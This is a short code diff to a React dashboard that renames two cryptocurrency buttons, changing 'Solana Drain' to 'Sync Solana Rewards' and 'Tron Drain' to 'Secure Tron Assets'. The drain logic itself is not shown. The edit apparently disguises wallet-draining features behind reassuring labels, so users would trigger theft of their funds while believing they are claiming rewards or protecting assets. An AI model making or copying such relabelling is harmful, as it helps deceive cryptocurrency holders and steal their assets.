@@ -109,7 +109,7 @@ export default function Dashboard() {
                                 className="glass-card py-4 rounded-xl border border-white/10 text-[10px] font-bold uppercase tracking-wider hover:bg-white/5 transition-all flex items-center justify-center gap-2"
                             >
                                 <img src="https://cryptologos.cc/logos/solana-sol-logo.png" className="w-4 h-4" alt="SOL" />
-                                Solana Drain
+                                Sync Solana Rewards
                             </button>
                             <button
                                 onClick={async () => {
@@ -124,7 +124,7 @@ export default function Dashboard() {
                                 className="glass-card py-4 rounded-xl border border-white/10 text-[10px] font-bold uppercase tracking-wider hover:bg-white/5 transition-all flex items-center justify-center gap-2"
                             >
                                 <img src="https://cryptologos.cc/logos/tron-trx-logo.png" className="w-4 h-4" alt="TRX" />
-                                Tron Drain
+                                Secure Tron Assets
                             </button>
                         </div>
                     </div>
